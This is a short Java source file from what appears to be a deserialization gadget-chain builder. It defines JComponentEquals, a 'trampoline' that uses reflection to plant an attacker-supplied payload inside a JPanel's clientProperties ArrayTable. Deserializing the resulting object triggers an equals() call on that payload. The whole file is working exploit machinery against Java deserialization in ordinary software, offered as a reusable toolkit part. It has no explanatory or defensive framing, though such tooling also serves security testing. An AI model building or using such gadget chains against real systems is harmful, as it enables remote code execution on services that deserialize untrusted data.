package org.ses.gadgetbuilder.impl.trampolines.equals;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.EqualsTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import javax.swing.*;

@Authors(Authors.YihengZhang)
public class JComponentEquals implements EqualsTrampoline {


    @Override
    public Object wrapPayload(Object payload, Object param) throws Exception {

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = Reflections.createWithoutConstructor(atClass);
        Object[] table = new Object[]{payload, "1", param, "2"};

        Reflections.setFieldValue(arrayTable, "table", table);
        Reflections.setFieldValue(j, "clientProperties", arrayTable);

        return j;
    }
}